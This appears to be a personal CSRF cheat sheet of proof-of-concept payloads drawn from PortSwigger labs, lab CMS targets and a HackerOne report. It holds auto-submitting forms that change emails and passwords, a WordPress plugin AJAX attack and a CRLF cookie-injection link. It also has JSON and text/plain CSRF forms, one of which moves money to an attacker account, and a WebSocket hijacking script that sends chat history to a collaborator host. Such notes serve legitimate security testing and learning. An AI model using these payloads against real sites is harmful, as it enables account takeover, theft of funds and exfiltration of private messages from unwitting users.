## POCs 
### Portswigger
```html
<form method="POST" action="https://vulnerable-website.com/my-account/change-email">
	<input type="hidden" name="email" value="anything%40web-security-academy.net">
</form> 
<script> 
document.forms[0].submit(); 
</script>
```
### XHR req sample
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GOODCMS CSRF exploit!</title>
    <script>

        function runCSRF() {
            // It changes the password by sending the request to the server
            // But you cannot view the resulting response because of SOP
            let request = new XMLHttpRequest();
            request.onreadystatechange = function () {
                if (request.readyState == 4 && request.status == 200) {
                    console.log(`[*] Password changed to 'user'`);
                }
            }
            request.open("POST", "http://goodcms.lab:32224/change_pass");
            request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            request.withCredentials = true;
            request.send("password=user&password_repeat=user");
        }
        window.onload = function () {
            runCSRF();
        };
    </script>
</head>
<body>
</body>
</html>
```
### CSRF in a WordPress’s plugin( ajax )
```html
<html>
<title>Normal site</title>
<script src='jquery.min.js'></script>
<meta charset="utf-8"/>
<center>
    <br>
    <h1>Normal Site</h1>
    <br><br>
    <img src='troll.png' style="height: 70%;width: 40%;"></img>
</center>
<script type="text/javascript">

function exploit(){

    var targetUrl = 'http://owasp-class.lab:48010'
    var quizID = 1

	$.ajax(
	{
        url: targetUrl + '/wp-admin/admin.php?page=mlw_quiz_options&quiz_id=' + quizID,
        data: {'question_type': '0', 'question_name': 'Hacker man', 'correct_answer_info': '', 'hint': '', 'comments': '1', 'new_question_order': 2, 'required': 0, 'new_new_category': '', 'new_question_answer_total': 0, 'question_submission': 'new_question', 'quiz_id': quizID, 'question_id': '0'},
        type: 'POST',
    	xhrFields: {
           withCredentials: true
        },
        crossDomain: true
	});
	
}
exploit();
</script>
</html>
```
## Senarios
### token tied to non-session cookie 
(like when they use two *seperate frameworks* ) : [portswigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)
#### step1: csrfKey cookie injection 

> 1. `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`

#### step2: using img tag for delivering the crafted link

>1. `<img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`

### cross-site WebSocket hijacking (CSWSH)
- no csrf token => loads all the chat history
```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

```

### Content-Type based CSRF
#### json-CSRF
- ![[Pasted image 20251123170930.png]]
- ![[Pasted image 20251123171000.png]]

Usually, JSON is CSRF-safe(why? ->AJAX -> SOP), but only when requests with content-type other than application/json gets rejected or additional CSRF protection is in place (Authorization headers/API keys).

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="https://app.example.com/api/profile/update" method="POST" enctype="text/plain">
      <input type="hidden" name='{"test":"x' value='y","new_email":"attacker@example.com"}'/>
      <input type="submit" value="Submit request"/>
    </form>
    <script>history.pushState('','','/');document.forms[0].submit();</script>
  </body>
</html>
```
[POC for json-CSRF ](https://hackerone.com/reports/245346) -> uses ==text/plain== 
```html 
<html>
  <body>
    <form action="https://members.bankofdirectdefense.com/accounts/transfer" method="POST" enctype="text/plain">
      <input type="hidden" name="{\"from-account\": 1,\"toAccount\": \"021000021-9876543210\",\"amount\": 1000,\"currency\": \"USD\",\"foo" value="\":\"bar\"}" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
also test application/x-www-form-urlencoded and multipart/form-data

### Referrer-based CSRF

- Bypass checker function:
  ![[Pasted image 20251123173420.png]]
	- ![[Pasted image 20251123173431.png]]
- POC with No Referrer header:
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <!-- Prevent referer header from being sent -->
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://app.example.com/api/profile/update" method="POST">
      <input type="hidden" name="new_email" value="attacker@example.com"/>
      <input type="submit" value="Submit request"/>
    </form>
    <script>history.pushState('','','/');document.forms[0].submit();</script>
  </body>
</html>
```
### CSRF in Graphql endpoints
-  rememeber you can pass the variables using **`query=...&variables=...`** 
  > example:  POST request with `application/x-www-form-urlencoded` content type
```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```
=> it will result to the following POC:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0500dc0357bf3080f85d5900fe0081.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;b&#64;hacker&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```